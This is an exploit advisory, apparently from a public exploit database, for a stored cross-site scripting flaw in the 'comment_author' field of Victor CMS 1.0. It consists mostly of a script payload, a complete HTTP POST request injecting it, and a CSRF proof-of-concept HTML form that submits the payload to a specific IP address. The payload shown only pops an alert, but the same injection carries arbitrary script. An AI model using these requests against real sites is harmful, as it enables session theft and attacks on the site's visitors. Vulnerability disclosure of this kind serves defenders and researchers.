# Exploit Title: Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting
# Google Dork: N/A
# Date: 2020-05-19
# Exploit Author: Kishan Lal Choudhary
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Version: 1.0
# Tested on: Windows 10

Description: The POST parameter 'comment_author' is vulnerable to stored cross site scripting
Payload: <script>alert(1)</script>


POST /post.php?post=1 HTTP/1.1
Host: localhost
Content-Length: 146
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://localhost/post.php?post=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,fr;q=0.7
Cookie: PHPSESSID=cjpan858fghefnjse7qv1j3v72
Connection: close

comment_author=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&comment_email=lol%40lol.com&comment_content=%3Cp%3Etester%3C%2Fp%3E&create_comment=


------------------------------------------------------------------------------------------------------------------------------------------------------------------

CSRF

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://149.28.135.91/post.php?post=1" method="POST">
      <input type="hidden" name="comment&#95;author" value="<script>alert&#40;"XSS"&#41;<&#47;script>" />
      <input type="hidden" name="comment&#95;email" value="lol&#64;lol&#46;com" />
      <input type="hidden" name="comment&#95;content" value="<p>tester<&#47;p>" />
      <input type="hidden" name="create&#95;comment" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>